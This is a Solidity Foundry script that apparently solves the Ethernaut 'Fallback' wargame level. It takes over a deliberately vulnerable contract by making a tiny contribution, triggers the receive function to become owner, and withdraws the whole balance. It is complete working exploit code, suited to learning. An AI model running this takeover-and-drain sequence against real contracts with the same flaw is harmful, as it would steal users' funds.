// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

interface IFallback {
    function contribute() external payable;
    function owner() external view returns (address);
    function withdraw() external;
}

contract HackFallback is Script {
    function run() external {
        address fallbackAddress = vm.envAddress("FALLBACK_ADDRESS");

        IFallback target = IFallback(fallbackAddress);

        uint256 pk = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(pk);

        console2.log("Derived Player Address:");
        console2.logAddress(player);

        vm.startBroadcast();

        // 1. make a small contribution
        target.contribute{value: 0.0001 ether}();

        // 2. send ether to trigger the receive function
        (bool sent, ) = fallbackAddress.call{value: 0.0001 ether}("");
        require(sent, "Failed to send Ether");

        // 3. verify ownership
        require(target.owner() == player, "Exploit failed: not the owner");

        // 4. withdraw funds
        target.withdraw();

        // 5. verify contract balance is zero
        uint256 contractBalance = address(fallbackAddress).balance;
        require(
            contractBalance == 0,
            "Exploit failed: contract balance not zero"
        );

        vm.stopBroadcast();
    }

    // allow sending ETH from script
    receive() external payable {}
}
